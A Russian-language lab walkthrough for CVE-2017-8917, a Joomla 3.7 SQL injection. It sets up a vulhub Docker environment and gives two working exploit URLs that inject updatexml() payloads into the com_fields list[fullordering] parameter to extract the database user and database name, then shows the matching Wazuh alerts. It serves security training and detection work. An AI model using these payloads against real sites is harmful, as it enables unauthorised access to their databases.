# CVE-2017-8917

### Материалы:

* [https://nvd.nist.gov/vuln/detail/CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917)
* [https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html](https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html)
* [https://www.programmersought.com/article/11485914091/](https://www.programmersought.com/article/11485914091/)

Joomla! — система управления содержимым (CMS), написанная на языках PHP и JavaScript, использующая в качестве хранилища базы данных СУБД MySQL или другие стандартные промышленные реляционные СУБД.

Уязвимость SQL-инъекций в Joomla! 3.7.x до версии 3.7.1 позволяет злоумышленникам выполнять произвольные SQL-команды через неопределенные векторы.

### Эксплуатация уязвимости

> Контейнер с уязвимой средой находится в директории /home/user/Hackathon/vulhub-master/joomla/CVE-2017-8917

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8080 будет доступна домашняя страница Joomla!

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Для реализации уязвимости перейдите по данной ссылке, перед этим заменив "ваш-ip" на ip машины с уязвимой средой:

```
http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Также вы можете узнать название базы данных, заменив "user" на "database" в ссылке

```
http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,database()),1)
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

В Wazuh ([https://ваш-ip/app/wazuh](https://xn---ip-5cdj7k/app/wazuh)) мы можем увидеть соответствующие алерты об эксплуатации SQL-инъекции Joomla!

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
